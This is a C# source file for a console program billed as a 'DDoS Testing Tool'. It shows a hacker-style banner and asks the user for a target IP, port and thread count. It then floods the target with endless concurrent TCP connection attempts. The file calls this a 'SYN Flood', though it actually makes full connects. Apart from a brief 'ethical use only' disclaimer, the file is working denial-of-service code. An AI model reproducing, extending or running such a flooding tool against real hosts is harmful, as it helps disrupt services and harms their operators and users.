// Copyright (c) 2025 batucs15
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.
//
// WARNING: This code is for ethical cybersecurity testing only.
// The author is not responsible for any misuse.

using System;
using System.Net.Sockets;
using System.Threading.Tasks;

class DDOS
{
    static async Task Main()
    {
        Console.ForegroundColor = ConsoleColor.DarkRed;
        Console.WriteLine("""
                        

            ██████╗ ██╗      █████╗  ██████╗██╗  ██╗███████╗██╗   ██╗███╗   ██╗
            ██╔══██╗██║     ██╔══██╗██╔════╝██║ ██╔╝██╔════╝╚██╗ ██╔╝████╗  ██║
            ██████╔╝██║     ███████║██║     █████╔╝ ███████╗ ╚████╔╝ ██╔██╗ ██║
            ██╔══██╗██║     ██╔══██║██║     ██╔═██╗ ╚════██║  ╚██╔╝  ██║╚██╗██║
            ██████╔╝███████╗██║  ██║╚██████╗██║  ██╗███████║   ██║   ██║ ╚████║
            ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═══╝

            ██████╗ ███████╗ █████╗ ██████╗ ███████╗██████╗                    
            ██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔════╝██╔══██╗                   
            ██████╔╝█████╗  ███████║██████╔╝█████╗  ██████╔╝                   
            ██╔══██╗██╔══╝  ██╔══██║██╔═══╝ ██╔══╝  ██╔══██╗                   
            ██║  ██║███████╗██║  ██║██║     ███████╗██║  ██║                   
            ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝                   

            
            """);
        Console.WriteLine("https://github.com/batucs15");
        Console.WriteLine("DDoS Testing Tool - USE ONLY FOR ETHICAL PURPOSES!");
        Console.ResetColor();
        Console.WriteLine("Stay legal and ethical! Only test systems you have permission for.\n");

        Console.Write("Target IP: ");
        string target = Console.ReadLine();
        Console.Write("Target Port: ");
        int port;
        while (!int.TryParse(Console.ReadLine(), out port) || port <= 0)
        {
            Console.Write("Enter a valid port number: ");
        }
        Console.Write("Number of threads: ");
        int threadCount;
        while (!int.TryParse(Console.ReadLine(), out threadCount) || threadCount <= 0)
        {
            Console.Write("Enter a valid number of threads: ");
        }

        Console.WriteLine($"SYN Flood starting... Target: {target}:{port}");
        var tasks = new Task[threadCount];

        for (int i = 0; i < threadCount; i++)
        {
            int index = i;
            tasks[index] = Task.Run(async () =>
            {
                while (true) // No attempt limit, runs until stopped
                {
                    try
                    {
                        using (var sock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp))
                        {
                            await sock.ConnectAsync(target, port);
                            Console.WriteLine($"Connection successful: {target}:{port}");
                            sock.Close();
                        }
                    }
                    catch (SocketException ex)
                    {
                        Console.WriteLine($"Socket Error: {ex.Message} (Error Code: {ex.SocketErrorCode})");
                        break;
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"General Error: {ex.Message}");
                        break;
                    }
                }
            });
        }

        await Task.WhenAll(tasks);
        Console.WriteLine("DDoS test completed.");
        Console.ReadLine();
    }
}
